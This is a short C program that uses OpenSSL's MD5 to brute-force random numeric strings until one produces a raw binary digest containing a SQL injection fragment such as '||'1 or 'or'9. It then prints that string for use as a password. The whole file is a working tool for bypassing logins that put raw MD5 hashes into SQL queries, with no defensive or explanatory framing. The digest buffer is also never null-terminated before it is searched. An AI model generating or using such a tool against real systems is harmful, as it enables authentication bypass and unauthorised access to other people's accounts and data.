#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

#include <openssl/md5.h>

#define MESSAGE_SIZE (256)

// returns true if digest contains something like '||'1, 'OR'1, 'or'9
int contains_payload(char * digest)
{
	char * match = strstr(digest, "'||'");

	if (!match) {
		match = strcasestr(digest, "'or'");
	}

	if (match && strlen(match) > 4 && match[4] >= '1' && match[4] <= '9') {
		return 1;
	}

	return 0;
}

int main(int argc, char ** argv)
{
	char message[MESSAGE_SIZE];
	char digest[MD5_DIGEST_LENGTH + 1];
	srand(time(0));

	int i = 0;

	do {
		snprintf(message, MESSAGE_SIZE, "%d%d%d%d", rand(), rand(),
		         rand(), rand());
		if (i % 1000000 == 0) {
			printf("iteration %d million\n", i / 1000000);
		}
		MD5((unsigned char *)message, strlen(message),
		    (unsigned char *)digest);
		++i;
	} while(!contains_payload(digest));

	puts("DONE");
	printf("   message: %s\n", message);
	printf("iterations: %d\n", i);
	printf("       raw: %s\n", digest);

	return 0;
}

